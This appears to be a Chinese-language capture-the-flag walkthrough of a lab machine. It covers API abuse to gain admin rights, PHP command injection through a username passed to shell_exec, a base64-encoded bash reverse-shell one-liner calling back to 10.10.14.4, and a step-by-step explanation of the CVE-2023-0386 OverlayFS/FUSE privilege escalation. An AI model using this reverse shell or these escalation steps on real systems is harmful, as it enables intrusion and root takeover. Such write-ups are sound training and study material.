code：`J67BT-DR7E2-5P0FH-BATQZ`

![image-20250929104901059](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250929104901059.png)

前面getshell的过都不难，先是通过抓包找生成邀请码界面，获取一个邀请码，就可以注册一个用户。关键点在于访问/api/v1查看有哪些页面，这里看到有admin下有三个，一个认证，一个update，一个生成vpn。去update页面发送数据包，错误信息会提示你缺少哪些参数，跟着走可以修改注册的用户为admin权限，然后去auth认证一下，就可以去vpn/generate生成vpn了。

这里关键点是在PHP RCE上。它php代码是这样的：

```
$output = shell_exec("/usr/bin/cat /var/www/html/VPN/user/$username.ovpn");
```

直接把username拼接到shell_exec执行的字符串中，我们可以通过`;`等实现任意命令注入。

这里直接反弹shell，注意和java的runtime.exec()一样，要base64编码：

但是形式不能相同，java反序列化的命令执行函数和php的shell_exec对语法支持不同，java就支持{base64,-i}这种写法，php则不行

```
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQo= | base64 -d | bash
```

拿到shell后可以在`.env`找到ssh的用户密码，连接上后就是提权问题。

这里可以找到一封邮件，提示要更新OS，最近关于overlay和FUSE的漏洞很让人害怕。

提权关键就在这里：

参考：https://github.com/chenaotian/CVE-2023-0386

```
漏洞编号: CVE-2023-0386
影响范围: Linux 内核版本：v5.11-rc1 ~ v6.2-rc5
利用效果: 本地提权
```

漏洞利用的关键有三个

1. Overlay文件系统
2. FUSE
3. 命名空间

Overlay文件系统：分为三层，lower层,upper层,merged层。

overlay真正挂载的是merged层，它合并展示了lower层和upper层的内容。

lower层和upperceng都可以有自己的文件系统，lower层只读，upper层只写。

所以我们如果在merged层修改一个lower层有而upper层没有的文件，系统会将文件从lower层拷贝到upper层，再修改。

漏洞就发生在这个拷贝环节。



FUSE：filesystem in userspace。不需要知道它具体是什么，只需要知道它可以让我们自定义实现一个文件系统，其实就是自定义文件系统的一些回到函数，即open，write，readdir等。

我们可以自定义任何文件，但是这个自定义也是有限制的，比如nosuid。这里的nosuid指的是忽略suid位，但是仍然可以设置suid位。

结合上面的overlay文件系统，我们在lower挂载用FUSE自定义的文件系统，包含一个恶意的设置了suid位的属于root的文件。我们可以通过在merged层修改这个文件（touch即可，touch会修改时间）导致它被copy到正常文件系统的upper层，在upper层就可以以root执行这个文件，完成提权



最后一个关键：用户命名空间。

上面的想法很美好，但是有一个残酷的现实：挂载文件系统需要root权限。但是我们挂载的目的本来就是提权到root，好像自相矛盾。这里就是用户命名空间出手的时候。我们使用`unshare`创建一个新的用户命名空间之后，我们（创建这个用户命名空间的用户）在这个新的命名空间内就是root权限。

这里涉及到用户映射的概念。我们原来的用户假设正常uid=1000，在这个命名空间中uid变成了0。因此有一个1000->0的映射。

我们在unshare之前创建好了FUSE系统和恶意文件，恶意文件此时是我们创建的，显示为root（因为在FUSE系统中），实际uid=1000。在**进入**命名空间的时候，1000->0的映射修改了恶意文件的uid，此时恶意文件所属的是新命名空间的root，uid=0,但是当它被拷贝到upper中，即**出**这个命名空间时，没有修改uid从0变回1000。所属用户uid=0保留了下来，suid位也保留了下来。

此漏洞的补丁就是：**对于拷贝的目标overlay 下层文件系统的文件，必须其属主(组)用户(组)在当前命名空间中有映射，才会继续下面的拷贝动作，否则返回错误。**也就是说必须把uid=0改回uid=1000。这里揭示了**映射的单向性**

```
FUSE文件 (命名空间内):
  uid=0 (虚拟root), SUID=1, 实际主机uid=1000
    ↓ copy-up (没有映射检查)
Upper文件 (主机文件系统):
  uid=0 (真实root!), SUID=1  ← 漏洞就在这里！
```

不难看出，核心漏洞点在于出命名空间时**没有映射关系**



利用过程如下：

1. 准备一个创建FUSE系统的程序并运行，创建一个显现属于root（实际uid=1000）设置了suid位的恶意文件
2. mkdir准备文件夹，用于overlay挂载。
3. `unshare -Urm`进入新的空间，获取虚拟root权限，恶意文件的uid被修改为uid=0
4. 挂载overlay文件系统，FUZE系统挂载到lower，upper挂正常系统，merged是overlay
5. 在merged中touch一下恶意文件，触发拷贝到upper中
6. 退出命名空间在upper中执行提权文件完成提权。

程序最好是可执行的elf文件（c写然后编译）或者shell脚本。python脚本不一定有环境支持。

